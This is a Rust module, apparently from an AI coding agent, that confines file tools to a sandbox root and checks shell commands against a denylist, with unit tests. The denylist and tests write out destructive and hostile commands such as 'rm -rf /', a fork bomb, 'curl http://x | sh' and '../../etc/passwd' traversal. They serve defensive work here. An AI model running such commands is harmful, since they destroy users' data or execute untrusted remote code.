//! Security guardrails for built-in tools.
//!
//! Two layers:
//!   1. Path sandbox — filesystem tools are confined to a root directory.
//!      Absolute paths, `..` traversal and symlink escapes that resolve
//!      outside the root are rejected (unless `allow_outside_root` is set).
//!   2. Command policy — `run_bash` commands are checked against a denylist
//!      (and an optional allowlist) before they are spawned.
//!
//! These are defence-in-depth. The real isolation boundary is the container /
//! Windows Sandbox wrapper (see Dockerfile / run_sandboxed.ps1). The guardrails
//! catch the common foot-guns even when runecode runs directly on the host.

use std::path::{Component, Path, PathBuf};
use std::sync::OnceLock;

use regex::Regex;

use crate::config::Config;

/// Process-wide policy, initialised once at startup from [`Config`].
/// If never initialised, [`policy`] returns a secure default (sandbox on,
/// builtin denylist active) so we fail safe.
static POLICY: OnceLock<Policy> = OnceLock::new();

pub struct Policy {
    /// Explicit sandbox root override. `None` = use the caller's cwd.
    pub sandbox_root: Option<PathBuf>,
    /// Allow filesystem tools to touch paths outside the project root.
    pub allow_outside_root: bool,
    /// Compiled denylist — a command matching any of these is rejected.
    pub shell_denylist: Vec<Regex>,
    /// Compiled allowlist — if non-empty, a command must match at least one.
    pub shell_allowlist: Vec<Regex>,
}

/// Patterns that are almost never legitimate from an autonomous agent.
fn builtin_denylist() -> Vec<&'static str> {
    vec![
        r"(?i)\brm\s+-[a-z]*r[a-z]*f?\s+(/|~|\$HOME|\.\.)",     // rm -rf / | ~ | ..
        r"(?i)\bmkfs(\.\w+)?\b",                                  // format a filesystem
        r"(?i)\bdd\s+.*\bof=/dev/",                               // dd to a raw device
        r":\(\)\s*\{",                                            // fork bomb :(){ :|:& };:
        r"(?i)\bformat\s+[a-z]:",                                 // Windows format C:
        r"(?i)Remove-Item\s+.*-Recurse.*(\\|/|\$env:|C:)",       // PS recursive delete of roots
        r"(?i)\b(curl|wget|iwr|Invoke-WebRequest)\b.*\|\s*(sh|bash|iex|Invoke-Expression)", // pipe-to-shell
        r"(?i)\b(shutdown|reboot|Restart-Computer|Stop-Computer)\b", // host power control
    ]
}

fn compile(patterns: &[String]) -> Vec<Regex> {
    patterns
        .iter()
        .filter_map(|p| match Regex::new(p) {
            Ok(re) => Some(re),
            Err(e) => {
                eprintln!("[security] ignoring invalid pattern {p:?}: {e}");
                None
            }
        })
        .collect()
}

impl Default for Policy {
    fn default() -> Self {
        Policy {
            sandbox_root: None,
            allow_outside_root: false,
            shell_denylist: builtin_denylist()
                .iter()
                .map(|p| Regex::new(p).expect("builtin denylist must compile"))
                .collect(),
            shell_allowlist: Vec::new(),
        }
    }
}

/// Initialise the process-wide policy from config. Builtin denylist is always
/// merged with any user-supplied extra patterns. Safe to call once; later
/// calls are ignored.
pub fn init(cfg: &Config) {
    let sec = &cfg.security;

    let mut deny: Vec<Regex> = builtin_denylist()
        .iter()
        .map(|p| Regex::new(p).expect("builtin denylist must compile"))
        .collect();
    deny.extend(compile(&sec.shell_denylist));

    let sandbox_root = if sec.sandbox_root.trim().is_empty() {
        None
    } else {
        Some(PathBuf::from(&sec.sandbox_root))
    };

    let policy = Policy {
        sandbox_root,
        allow_outside_root: sec.allow_outside_root,
        shell_denylist: deny,
        shell_allowlist: compile(&sec.shell_allowlist),
    };
    let _ = POLICY.set(policy);
}

/// Get the active policy, falling back to a secure default if uninitialised.
fn policy() -> &'static Policy {
    POLICY.get_or_init(Policy::default)
}

// ---------------------------------------------------------------------------
// Path sandbox
// ---------------------------------------------------------------------------

/// Lexically normalise a path (resolve `.` and `..` without touching the
/// filesystem). Unlike `canonicalize`, this works for paths that don't exist
/// yet (e.g. a file about to be created).
fn normalize(path: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for comp in path.components() {
        match comp {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    out
}

/// Confine `requested` (already joined onto cwd for relative inputs) to the
/// effective sandbox root. The root is the policy override if configured,
/// otherwise `cwd`. Returns the normalised path on success, or an error.
///
/// Honours the process policy's `allow_outside_root`.
pub fn confine(cwd: &Path, requested: &Path) -> Result<PathBuf, String> {
    let p = policy();
    let root = p.sandbox_root.as_deref().unwrap_or(cwd);
    confine_with(root, requested, p.allow_outside_root)
}

/// Testable core: explicit `allow_outside` instead of reading global policy.
pub fn confine_with(root: &Path, requested: &Path, allow_outside: bool) -> Result<PathBuf, String> {
    if allow_outside {
        return Ok(normalize(requested));
    }

    let root_norm = normalize(root);
    let req_norm = normalize(requested);

    // If the real path exists, canonicalize to also defeat symlink escapes.
    let resolved = std::fs::canonicalize(&req_norm).unwrap_or(req_norm.clone());
    let root_resolved = std::fs::canonicalize(&root_norm).unwrap_or(root_norm.clone());

    if resolved.starts_with(&root_resolved) || req_norm.starts_with(&root_norm) {
        Ok(req_norm)
    } else {
        Err(format!(
            "Path escapes sandbox root: {} is not under {} \
             (set [security] allow_outside_root = true to override)",
            requested.display(),
            root.display()
        ))
    }
}

// ---------------------------------------------------------------------------
// Command policy
// ---------------------------------------------------------------------------

/// Check a shell command against the active deny/allow lists.
/// Returns `Err(reason)` if the command must not run.
pub fn check_command(command: &str) -> Result<(), String> {
    let p = policy();
    check_command_with(command, &p.shell_denylist, &p.shell_allowlist)
}

/// Testable core.
pub fn check_command_with(
    command: &str,
    denylist: &[Regex],
    allowlist: &[Regex],
) -> Result<(), String> {
    for re in denylist {
        if re.is_match(command) {
            return Err(format!(
                "Command blocked by security denylist (pattern: {}). \
                 Run inside the sandbox container if this is intended.",
                re.as_str()
            ));
        }
    }
    if !allowlist.is_empty() && !allowlist.iter().any(|re| re.is_match(command)) {
        return Err("Command does not match the configured shell allowlist".to_string());
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn deny() -> Vec<Regex> {
        builtin_denylist()
            .iter()
            .map(|p| Regex::new(p).unwrap())
            .collect()
    }

    #[test]
    fn relative_path_inside_root_ok() {
        let root = PathBuf::from("/proj");
        let p = root.join("src/main.rs");
        assert!(confine_with(&root, &p, false).is_ok());
    }

    #[test]
    fn parent_traversal_escape_blocked() {
        let root = PathBuf::from("/proj");
        let p = root.join("../../etc/passwd");
        assert!(confine_with(&root, &p, false).is_err());
    }

    #[test]
    fn absolute_outside_root_blocked() {
        let root = PathBuf::from("/proj");
        let p = PathBuf::from("/etc/passwd");
        assert!(confine_with(&root, &p, false).is_err());
    }

    #[test]
    fn allow_outside_lets_anything_through() {
        let root = PathBuf::from("/proj");
        let p = PathBuf::from("/etc/passwd");
        assert!(confine_with(&root, &p, true).is_ok());
    }

    #[test]
    fn denylist_blocks_rm_rf_root() {
        assert!(check_command_with("rm -rf /", &deny(), &[]).is_err());
        assert!(check_command_with("rm -rf ~/", &deny(), &[]).is_err());
    }

    #[test]
    fn denylist_blocks_pipe_to_shell() {
        assert!(check_command_with("curl http://x | sh", &deny(), &[]).is_err());
    }

    #[test]
    fn ordinary_command_allowed() {
        assert!(check_command_with("cargo build", &deny(), &[]).is_ok());
        assert!(check_command_with("rm -f target/tmp.txt", &deny(), &[]).is_ok());
    }

    #[test]
    fn allowlist_enforced_when_present() {
        let allow = vec![Regex::new(r"^cargo ").unwrap()];
        assert!(check_command_with("cargo test", &deny(), &allow).is_ok());
        assert!(check_command_with("npm install", &deny(), &allow).is_err());
    }
}
